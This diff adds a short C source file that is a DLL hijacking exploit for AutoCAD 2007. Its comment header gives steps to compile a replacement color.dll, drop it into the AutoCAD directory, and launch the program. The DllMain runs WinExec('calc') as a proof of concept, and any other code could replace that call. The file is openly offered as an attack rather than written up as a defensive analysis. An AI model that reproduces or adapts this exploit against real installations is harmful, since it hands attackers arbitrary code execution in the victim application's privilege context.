@@ -1,0 +1,36 @@
+/*
+Description: 
+A vulnerability exists in windows that allows other applications dynamic link libraries
+to execute malicious code without the users consent, in the privelage context of the targeted application.
+
+Title: Autocad 2007 Professional dll (color.dll) Hijacking exploit
+Author: xsploited security
+URL: http://www.x-sploited.com/
+Email: xsploitedsecurity@gmail.com
+
+Instructions:
+
+1. Compile dll
+2. Replace color.dll in autocad directory with your newly compiled dll
+3. Launch Autocad 2007
+4. Boom calc!
+
+Shoutz:
+
+kAoTiX, Deca, Drizzle, 0xJeremy, Sheep, SpliT, all other security guru's and teams.
+*/
+
+#include <windows.h>
+
+int pwnme()
+{
+  WinExec("calc", SW_NORMAL);
+  exit(0);
+  return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+  pwnme();
+  return 0;
+}
